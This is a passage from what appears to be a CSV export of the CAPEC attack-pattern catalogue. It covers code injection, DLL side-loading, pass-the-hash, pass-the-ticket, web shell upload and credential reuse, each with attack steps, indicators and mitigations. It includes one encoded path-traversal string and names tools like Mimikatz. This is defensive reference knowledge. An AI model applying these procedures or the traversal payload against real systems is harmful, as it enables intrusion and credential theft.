Instead, use the POST method whenever possible.::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.::Refer to the RFCs to safely decode URL.::Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.::There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).::\",\"::Attack Example: Combined Encodings CesarFTP Alexandre Cesari released a freeware FTP server for Windows that fails to provide proper filtering against multiple encoding. The FTP server, CesarFTP, included a Web server component that could be attacked with a combination of the triple-dot and URL encoding attacks. An attacker could provide a URL that included a string like /...%5C/ This is an interesting exploit because it involves an aggregation of several tricks: the escape character, URL encoding, and the triple dot.See also: CVE-2001-1335::\",\"::177::173::172::73::22::74::20::697::707::\",\"\",\"\",\n640,\"Inclusion of Code in Existing Process\",Detailed,Stable,\"The adversary takes advantage of a bug in an application failing to verify the integrity of the running process to execute arbitrary code in the address space of a separate live process. The adversary could use running code in the context of another process to try to access process's memory, system/network resources, etc. The goal of this attack is to evade detection defenses and escalate privileges by masking the malicious code under an existing legitimate process. Examples of approaches include but not limited to: dynamic-link library (DLL) injection, portable executable injection, thread execution hijacking, ptrace system calls, VDSO hijacking, function hooking, reflective code loading, and more.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:251::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target process] The adversary determines a process with sufficient privileges that they wish to include code into.:TECHNIQUE:On Windows, use the process explorer's security tab to see if a process is running with administror privileges.:TECHNIQUE:On Linux, use the ps command to view running processes and pipe the output to a search for a particular user, or the root user.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt to include simple code with known output] The adversary attempts to include very simple code into the existing process to determine if the code inclusion worked. The code will differ based on the approach used to include code into an existing process.::STEP:3:PHASE:Exploit:DESCRIPTION:[Include arbitrary code into existing process] Once an adversary has determined that including code into the existing process is possible, they will include code for a targeted purpose, such as accessing that process's memory.::\",\"::The targeted application fails to verify the integrity of the running process that allows an adversary to execute arbitrary code.::\",\"::SKILL:Knowledge of how to load malicious code into the memory space of a running process, as well as the ability to have the running process execute this code. For example, with DLL injection, the adversary must know how to load a DLL into the memory space of another running process, and cause this process to execute the code inside of the DLL.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:SCOPE:Confidentiality:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Read Data::\",\"::Prevent unknown or malicious software from loading through using an allowlist policy.::Properly restrict the location of the software being used.::Leverage security kernel modules providing advanced access control and process restrictions like SELinux.::Monitor API calls like CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC, and similar for Windows.::Monitor API calls like ptrace system call, use of LD_PRELOAD environment variable, dlfcn dynamic linking API calls, and similar for Linux.::Monitor API calls like SetWindowsHookEx and SetWinEventHook which install hook procedures for Windows.::Monitor processes and command-line arguments for unknown behavior related to code injection.::\",\"\",\"::114::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1505.005:ENTRY NAME:Server Software Component: Terminal Services DLL::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.006:ENTRY NAME:Hijack Execution Flow: Dynamic Linker Hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.013:ENTRY NAME:Hijack Execution Flow: KernelCallbackTable::::TAXONOMY NAME:ATTACK:ENTRY ID:1620:ENTRY NAME:Reflective Code Loading::\",\"\",\n641,\"DLL Side-Loading\",Detailed,Stable,\"An adversary places a malicious version of a Dynamic-Link Library (DLL) in the Windows Side-by-Side (WinSxS) directory to trick the operating system into loading this malicious DLL instead of a legitimate DLL. Programs specify the location of the DLLs to load via the use of WinSxS manifests or DLL redirection and if they aren't used then Windows searches in a predefined set of directories to locate the file. If the applications improperly specify a required DLL or WinSxS manifests aren't explicit about the characteristics of the DLL to be loaded, they can be vulnerable to side-loading.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:159::\",\"\",\"::The target must fail to verify the integrity of the DLL before using them.::\",\"::SKILL:Trick the operating system in loading a malicious DLL instead of a legitimate DLL.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Prevent unknown DLLs from loading through using an allowlist policy.::Patch installed applications as soon as new updates become available.::Properly restrict the location of the software being used.::Use of sxstrace.exe on Windows as well as manual inspection of the manifests.::Require code signing and avoid using relative paths for resources.::\",\"\",\"::706::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.002:ENTRY NAME:Hijack Execution Flow:DLL Side-Loading::\",\"\",\n642,\"Replace Binaries\",Detailed,Draft,\"Adversaries know that certain binaries will be regularly executed as part of normal processing. If these binaries are not protected with the appropriate file system permissions, it could be possible to replace them with malware. This malware might be executed at higher system permission levels. A variation of this pattern is to discover self-extracting installation packages that unpack binaries to directories with weak file permissions which it does not clean up appropriately. These binaries can be replaced by malware, which can then be executed.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:17::\",\"\",\"::The attacker must be able to place the malicious binary on the target machine.::\",\"\",\"\",\"\",\"\",\"::Insure that binaries commonly used by the system have the correct file permissions. Set operating system policies that restrict privilege elevation of non-Administrators. Use auditing tools to observe changes to system services.::\",\"::The installer for a previous version of Firefox would use a DLL maliciously placed in the default download directory instead of the existing DLL located elsewhere, probably due to DLL hijacking. This DLL would be run with administrator privileges if the installer has those privileges.::By default, the Windows screensaver application SCRNSAVE.exe leverages the scrnsave.scr Portable Executable (PE) file in C:Windowssystem32. This value is set in the registry at HKEY_CURRENT_USERControl PanelDesktop, which can be modified by an adversary to instead point to a malicious program. This program would then run any time the SCRNSAVE.exe program is activated and with administrator privileges. An adversary may additionally modify other registry values within the same location to set the SCRNSAVE.exe program to run more frequently.::\",\"::732::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1505.005:ENTRY NAME:Server Software Component: Terminal Services DLL::::TAXONOMY NAME:ATTACK:ENTRY ID:1554:ENTRY NAME:Compromise Client Software Binary::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.005:ENTRY NAME:Hijack Execution Flow:Executable Installer File Permissions Weakness::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Binary planting::\",\"\",\n643,\"Identify Shared Files/Directories on System\",Detailed,Draft,\"An adversary discovers connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. Through the identification of shared folders/drives between systems, the adversary may further their goals of locating and collecting sensitive information/files, or map potential routes for lateral movement within the network.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:309::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:545::NATURE:CanPrecede:CAPEC ID:165::\",\"\",\"::The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).::\",\"::SKILL:Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line. The adversary, or their malware, can simply employ a set of commands that search for shared drives on the system (e.g., net view remote system or net share).:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:The adversary is potentially able to identify the location of sensitive information or lateral pathways through the network.::\",\"::Identify unnecessary system utilities or potentially malicious software that may contain functionality to identify network share information, and audit and/or block them by using allowlist tools.::\",\"\",\"::267::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1135:ENTRY NAME:Network Share Discovery::\",\"\",\n644,\"Use of Captured Hashes (Pass The Hash)\",Detailed,Stable,\"An adversary obtains (i.e. steals or purchases) legitimate Windows domain credential hash values to access systems within the domain that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:653::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:165::NATURE:CanPrecede:CAPEC ID:549::NATURE:CanPrecede:CAPEC ID:545::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known Windows credential hash value pairs] The adversary must obtain known Windows credential hash value pairs of accounts that exist on the domain.:TECHNIQUE:An adversary purchases breached Windows credential hash value pairs from the dark web.:TECHNIQUE:An adversary conducts a sniffing attack to steal Windows credential hash value pairs as they are transmitted.:TECHNIQUE:An adversary gains access to a Windows domain system/files and exfiltrates Windows credential hash value pairs.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded Windows credential hash value pairs.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt domain authentication] Try each Windows credential hash value pair until the target grants access.:TECHNIQUE:Manually or automatically enter each Windows credential hash value pair through the target's interface.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications.::\",\"::The system/application is connected to the Windows domain.::The system/application leverages the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols.::The adversary possesses known Windows credential hash value pairs that exist on the target domain.::\",\"::SKILL:Once an adversary obtains a known Windows credential hash value pair, leveraging it is trivial.:LEVEL:Low::\",\"::A list of known Window credential hash value pairs for the targeted domain.::\",\"::Authentication attempts use credentials that have been used previously by the account in question.::Authentication attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::Data is being transferred and/or removed from systems/applications within the network.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Prevent the use of Lan Man and NT Lan Man authentication on severs and apply patch KB2871997 to Windows 7 and higher systems.::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::Monitor system and domain logs for abnormal credential access.::Create a strong password policy and ensure that your system enforces this policy.::Leverage system penetration testing and other defense in depth methods to determine vulnerable systems within a domain.::\",\"::Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credential hash value pairs from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]::Operation Soft Cell, which has been underway since at least 2012, leveraged a modified Mimikatz that dumped NTLM hashes. The acquired hashes were then used to authenticate to other systems within the network via Pass The Hash attacks. [REF-580]::\",\"::522::836::308::294::308::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1550.002:ENTRY NAME:Use Alternate Authentication Material:Pass The Hash::\",\"\",\n645,\"Use of Captured Tickets (Pass The Ticket)\",Detailed,Stable,\"An adversary uses stolen Kerberos tickets to access systems/resources that leverage the Kerberos authentication protocol. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. An adversary can obtain any one of these tickets (e.g. Service Ticket, Ticket Granting Ticket, Silver Ticket, or Golden Ticket) to authenticate to a system/resource without needing the account's credentials. Depending on the ticket obtained, the adversary may be able to access a particular resource or generate TGTs for any account within an Active Directory Domain.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:652::NATURE:CanPrecede:CAPEC ID:151::\",\"\",\"::The adversary needs physical access to the victim system.::The use of a third-party credential harvesting tool.::\",\"::SKILL:Determine if Kerberos authentication is used on the server.:LEVEL:Low::SKILL:The adversary uses a third-party tool to obtain the necessary tickets to execute the attack.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Gain Privileges::\",\"::Reset the built-in KRBTGT account password twice to invalidate the existence of any current Golden Tickets and any tickets derived from them.::Monitor system and domain logs for abnormal access.::\",\"::Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]::\",\"::522::294::308::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1550.003:ENTRY NAME:Use Alternate Authentication Material:Pass The Ticket::\",\"\",\n646,\"Peripheral Footprinting\",Standard,Stable,\"Adversaries may attempt to obtain information about attached peripheral devices and components connected to a computer system. Examples may include discovering the presence of iOS devices by searching for backups, analyzing the Windows registry to determine what USB devices have been connected, or infecting a victim system with malware to report when a USB device has been connected. This may allow the adversary to gain additional insight about the system or network environment, which may be useful in constructing further attacks.\",\"\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary needs either physical or remote access to the victim system.::\",\"::SKILL:The adversary needs to be able to infect the victim system in a manner that gives them remote access.:LEVEL:Medium::SKILL:If analyzing the Windows registry, the adversary must understand the registry structure to know where to look for devices.:LEVEL:Medium::\",\"\",\"\",\"\",\"::Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1120:ENTRY NAME:Peripheral Device Discovery::\",\"\",\n647,\"Collect Data from Registries\",Detailed,Draft,\"An adversary exploits a weakness in authorization to gather system-specific data and sensitive information within a registry (e.g., Windows Registry, Mac plist). These contain information about the system configuration, software, operating system, and security. The adversary can leverage information gathered in order to carry out further attacks.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:150::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Gain logical access to system] An adversary must first gain logical access to the system it wants to gather registry information from,:TECHNIQUE:Obtain user account credentials and access the system:TECHNIQUE:Plant malware on the system that will give remote logical access to the adversary::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine if the permissions are correct] Once logical access is gained, an adversary will determine if they have the proper permissions, or are authorized, to view registry information. If they do not, they will need to escalate privileges on the system through other means::STEP:3:PHASE:Experiment:DESCRIPTION:[Peruse registry for information] Once an adversary has access to a registry, they will gather all system-specific data and sensitive information that they deem useful.::STEP:4:PHASE:Exploit:DESCRIPTION:[Follow-up attack] Use any information or weaknesses found to carry out a follow-up attack::\",\"::The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).::The adversary must have capability to navigate the operating system to peruse the registry.::\",\"::SKILL:Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only the capability and facility to navigate the system through the OS graphical user interface or the command line.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:The adversary is able to read sensitive information about the system in the registry.::\",\"::Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.::Employ robust identification and audit/blocking via using an allowlist of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.::\",\"\",\"::285::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1005:ENTRY NAME:Data from Local System::::TAXONOMY NAME:ATTACK:ENTRY ID:1012:ENTRY NAME:Query Registry::::TAXONOMY NAME:ATTACK:ENTRY ID:1552.002:ENTRY NAME:Unsecured Credentials: Credentials in Registry::\",\"\",\n648,\"Collect Data from Screen Capture\",Detailed,Draft,\"An adversary gathers sensitive information by exploiting the system's screen capture functionality. Through screenshots, the adversary aims to see what happens on the screen over the course of an operation. The adversary can leverage information gathered in order to carry out further attacks.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:150::\",\"\",\"::The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).::\",\"::SKILL:Once the adversary has logical access (which can potentially require high knowledge and skill level), the adversary needs only to leverage the relevant command for screen capture.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:The adversary is able to capture potentially sensitive information and processes as they appear on the screen.::\",\"::Identify potentially malicious software that may have functionality to acquire screen captures, and audit and/or block it by using allowlist tools.::While screen capture is a legitimate and practical function, certain situations and context may require the disabling of this feature.::\",\"\",\"::267::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1113:ENTRY NAME:Screen Capture::::TAXONOMY NAME:ATTACK:ENTRY ID:1513:ENTRY NAME:Screen Capture::\",\"\",\n649,\"Adding a Space to a File Extension\",Detailed,Draft,\"An adversary adds a space character to the end of a file extension and takes advantage of an application that does not properly neutralize trailing special elements in file names. This extra space, which can be difficult for a user to notice, affects which default application is used to operate on the file and can be leveraged by the adversary to control execution.\",\"\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:635::\",\"\",\"::The use of the file must be controlled by the file extension.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::File extensions should be checked to see if non-visible characters are being included.::\",\"\",\"::46::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.006:ENTRY NAME:Masquerading:Space after Filename::\",\"\",\n65,\"Sniff Application Code\",Detailed,Draft,\"An adversary passively sniffs network communications and captures application code bound for an authorized client. Once obtained, they can use it as-is, or through reverse-engineering glean sensitive information or exploit the trust relationship between the client and server. Such code may belong to a dynamic update to the client, a patch being applied to a client component or any such interaction where the client is authorized to communicate with the server.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:157::NATURE:CanPrecede:CAPEC ID:37::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Set up a sniffer] The adversary sets up a sniffer in the path between the server and the client and watches the traffic.:TECHNIQUE:The adversary sets up a sniffer in the path between the server and the client.::STEP:2:PHASE:Exploit:DESCRIPTION:[Capturing Application Code Bound During Patching]adversary knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The adversary loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The adversary then proceeds to reverse engineer the captured code.:TECHNIQUE:adversary loads the sniffer to capture the application code bound during a dynamic update.:TECHNIQUE:The adversary proceeds to reverse engineer the captured code.::\",\"::The attacker must have the ability to place themself in the communication path between the client and server.::The targeted application must receive some application code from the server; for example, dynamic updates, patches, applets or scripts.::The attacker must be able to employ a sniffer on the network without being detected.::\",\"::SKILL:The attacker needs to setup a sniffer for a sufficient period of time so as to capture meaningful quantities of code. The presence of the sniffer should not be detected on the network. Also if the attacker plans to employ an adversary-in-the-middle attack (CAPEC-94), the client or server must not realize this. Finally, the attacker needs to regenerate source code from binary code if the need be.:LEVEL:Medium::\",\"::The Attacker needs the ability to capture communications between the client being updated and the server providing the update. In the case that encryption obscures client/server communication the attacker will either need to lift key material from the client.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Encrypt all communication between the client and server.::Implementation: Use SSL, SSH, SCP.::Operation: Use ifconfig/ipconfig or other tools to detect the sniffer installed in the network.::\",\"::Attacker receives notification that the computer/OS/application has an available update, loads a network sniffing tool, and extracts update data from subsequent communication. The attacker then proceeds to reverse engineer the captured stream to gain sensitive information, such as encryption keys, validation algorithms, applications patches, etc..::Plain code, such as applets or JavaScript, is also part of the executing application. If such code is transmitted unprotected, the attacker can capture the code and possibly reverse engineer it to gain sensitive information, such as encryption keys, validation algorithms and such.::\",\"::319::311::318::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1040:ENTRY NAME:Network Sniffing::\",\"\",\n650,\"Upload a Web Shell to a Web Server\",Detailed,Draft,\"By exploiting insufficient permissions, it is possible to upload a web shell to a web server in such a way that it can be executed remotely. This shell can have various capabilities, thereby acting as a gateway to the underlying web server. The shell might execute at the higher permission level of the web server, providing the ability the execute malicious code at elevated levels.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:17::\",\"\",\"::The web server is susceptible to one of the various web application exploits that allows for uploading a shell file.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Make sure your web server is up-to-date with all patches to protect against known vulnerabilities.::Ensure that the file permissions in directories on the web server from which files can be execute is set to the least privilege settings, and that those directories contents is controlled by an allowlist.::\",\"\",\"::287::553::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1505.003:ENTRY NAME:Server Software Component:Web Shell::\",\"\",\n651,\"Eavesdropping\",Standard,Draft,\"An adversary intercepts a form of communication (e.g. text, audio, video) by way of software (e.g., microphone and audio recording application), hardware (e.g., recording equipment), or physical means (e.g., physical proximity). The goal of eavesdropping is typically to gain unauthorized access to sensitive information about the target for financial, personal, political, or other gains. Eavesdropping is different from a sniffing attack as it does not take place on a network-based communication channel (e.g., IP traffic). Instead, it entails listening in on the raw audio source of a conversation between two or more parties.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:117::\",\"\",\"::The adversary typically requires physical proximity to the target's environment, whether for physical eavesdropping or for placing recording equipment. This is not always the case for software-based eavesdropping, if the adversary has the capability to install malware on the target system that can activate a microphone and record audio digitally.::\",\"\",\"::For logical eavesdropping, some equipment may be necessary (e.g., microphone, tape recorder, etc.). For physical eavesdropping, only proximity is required.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:The adversary gains unauthorized access to information.::\",\"::Be mindful of your surroundings when discussing sensitive information in public areas.::Implement proper software restriction policies to only allow authorized software on your environment. Use of anti-virus and other security monitoring and detecting tools can aid in this too. Closely monitor installed software for unusual behavior or activity, and implement patches as soon as they become available.::If possible, physically disable the microphone on your machine if it is not needed.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1111:ENTRY NAME:Multi-Factor Authentication Interception::\",\"\",\n652,\"Use of Known Kerberos Credentials\",Standard,Draft,\"An adversary obtains (i.e. steals or purchases) legitimate Kerberos credentials (e.g. Kerberos service account userID/password or Kerberos Tickets) with the goal of achieving authenticated access to additional systems, applications, or services within the domain.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:151::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known Kerberos credentials] The adversary must obtain known Kerberos credentials in order to access the target system, application, or service within the domain.:TECHNIQUE:An adversary purchases breached Kerberos service account username/password combinations or leaked hashed passwords from the dark web.:TECHNIQUE:An adversary guesses the credentials to a weak Kerberos service account.:TECHNIQUE:An adversary conducts a sniffing attack to steal Kerberos tickets as they are transmitted.:TECHNIQUE:An adversary conducts a Kerberoasting attack.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt Kerberos authentication] Try each Kerberos credential against various resources within the domain until the target grants access.:TECHNIQUE:Manually or automatically enter each Kerberos service account credential through the target's interface.:TECHNIQUE:Attempt a Pass the Ticket attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the domain::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into other systems on the domain. The adversary can also pose as a legitimate domain user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within domain systems or applications.::\",\"::The system/application leverages Kerberos authentication.::The system/application uses one factor password-based authentication, SSO, and/or cloud-based authentication for Kerberos service accounts.::The system/application does not have a sound password policy that is being enforced for Kerberos service accounts.::The system/application does not implement an effective password throttling mechanism for authenticating to Kerberos service accounts.::The targeted network allows for network sniffing attacks to succeed.::\",\"::SKILL:Once an adversary obtains a known Kerberos credential, leveraging it is trivial.:LEVEL:Low::\",\"::A valid Kerberos ticket or a known Kerberos service account credential.::\",\"::Authentication attempts use expired or invalid credentials.::Authentication attempts are originating from IP addresses or locations that are inconsistent with an account's normal IP addresses or locations.::Data is being transferred and/or removed from systems/applications within the network.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Create a strong password policy and ensure that your system enforces this policy for Kerberos service accounts.::Ensure Kerberos service accounts are not reusing username/password combinations for multiple systems, applications, or services.::Do not reuse Kerberos service account credentials across systems.::Deny remote use of Kerberos service account credentials to log into domain systems.::Do not allow Kerberos service accounts to be a local administrator on more than one system.::Enable at least AES Kerberos encryption for tickets.::Monitor system and domain logs for abnormal credential access.::\",\"::Bronze Butler (also known as Tick), has been shown to leverage forged Kerberos Ticket Granting Tickets (TGTs) and Ticket Granting Service (TGS) tickets to maintain administrative access on a number of systems. [REF-584]::PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]::\",\"::522::307::308::309::262::263::654::294::836::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1558:ENTRY NAME:Steal or Forge Kerberos Tickets::\",\"TYPE:Other:NOTE:Kerberos centers around a ticketing system that is used to request/grant access to resources and to then access the requested resources. If one of these tickets is acquired, an adversary could gain access to a specific resource; access any resource a user has privileges to access; gain access to services that use Kerberos as an authentication mechanism and generate tickets to access a particular resource and the system that hosts the resource; or generate Ticket Granting Tickets (TGTs) for any domain account within Active Directory.::\",\n653,\"Use of Known Operating System Credentials\",Standard,Draft,\"An adversary guesses or obtains (i.e. steals or purchases) legitimate operating system credentials (e.g. userID/password) to achieve authentication and to perform authorized actions on the system, under the guise of an authenticated user or service. This applies to any Operating System.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:151::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known operating system credentials] The adversary must obtain known operating system credentials in order to access the target system, application, or service within the domain.:TECHNIQUE:An adversary purchases breached operating system username/password combinations or leaked hashed passwords from the dark web.:TECHNIQUE:An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.:TECHNIQUE:An adversary conducts a sniffing attack to steal operating system credentials as they are transmitted.:TECHNIQUE:An adversary gains access to a system/files and exfiltrates password hashes.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded credentials.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt authentication] Try each operating system credential against various systems, applications, and services within the domain until the target grants access.:TECHNIQUE:Manually or automatically enter each credential through the target's interface.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within the network::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into other systems on the network. The adversary can also pose as a legitimate user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within system files or application configuration.::\",\"::The system/application uses one factor password-based authentication, SSO, and/or cloud-based authentication.::The system/application does not have a sound password policy that is being enforced.::The system/application does not implement an effective password throttling mechanism.::The adversary possesses a list of known user accounts and corresponding passwords that may exist on the target.::\",\"::SKILL:Once an adversary obtains a known credential, leveraging it is trivial.:LEVEL:Low::\",\"::A list of known credentials for the targeted domain.::A custom script that leverages a credential list to launch an attack.::\",\"::Authentication attempts use credentials that have been used previously by the account in question.::Authentication attempts are originating from IP addresses or locations that are inconsistent with a user's normal IP addresses or locations.::Data is being transferred and/or removed from systems/applications within the network.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the network.::Create a strong password policy and ensure that your system enforces this policy.::Ensure users are not reusing username/password combinations for multiple systems, applications, or services.::Do not reuse local administrator account credentials across systems.::Deny remote use of local admin credentials to log into domain systems.::Do not allow accounts to be a local administrator on more than one system.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Monitor system and domain logs for abnormal credential access.::\",\"::Adversaries exploited the Zoom video conferencing application during the 2020 COVID-19 pandemic to exfiltrate Windows domain credentials from a target system. The attack entailed sending Universal Naming Convention (UNC) paths within the Zoom chat window of an unprotected Zoom call. If the victim clicked on the link, their Windows usernames and the corresponding Net-NTLM-v2 hashes were sent to the address contained in the link. The adversary was then able to infiltrate and laterally move within the Windows domain by passing the acquired credentials to shared network resources. This further provided adversaries with access to Outlook servers and network storage devices. [REF-575]::Mimikatz, a post-exploitation Windows credential harvester, can be used to gather and exploit Windows credentials. This malware has been used in several known cyberattacks, such as the Petya Ransomeware attacks. [REF-576]::\",\"::522::307::308::309::262::263::654::\",\"\",\"\",\n654,\"Credential Prompt Impersonation\",Detailed,Stable,\"An 